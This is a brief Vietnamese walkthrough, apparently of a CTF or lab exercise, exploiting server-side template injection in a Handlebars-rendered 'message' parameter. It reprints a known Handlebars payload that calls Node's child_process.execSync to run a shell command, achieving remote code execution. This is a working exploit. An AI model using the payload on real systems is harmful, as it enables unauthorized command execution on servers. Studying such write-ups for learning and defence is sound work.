![image](https://github.com/user-attachments/assets/cb0bd195-9ce2-410a-bbe1-e5255b6a53c7)

![image](https://github.com/user-attachments/assets/063d98da-4f32-48f8-b349-dbaebf316179)

Lần này lỗi nó lại xuất hiện ở param message, ta tiến hành fuzz vào thì nó trả ra là đang dùng template `handlebars`.

Tiến hành tìm kiếm docs của thằng này để xem format của nó.

Thì đại loại thằng này nó cũng dùng dạng như `{{ }}` để inject, nhưng sau khi tôi tham khảo thì có 1 payload của các anh bug hunter làm ra.

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

{{#with}} giúp gọi đến các object và thuộc tính của chúng một cách dễ dàng hơn trong Handlebars. Khi sử dụng {{#with}}, bạn có thể truy cập trực tiếp vào các thuộc tính của object mà không cần lặp lại tên object đó nhiều lần. Điều này giúp code gọn gàng và dễ quản lý hơn.

Nhìn kĩ thì nó lặp đó v:, sau nó gọi vào hàm con của nodejs và RCE.

![image](https://github.com/user-attachments/assets/62dbc47e-ef1c-45f6-930a-129768e1c258)

Và thành công
# REFERENCES
[1]. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars
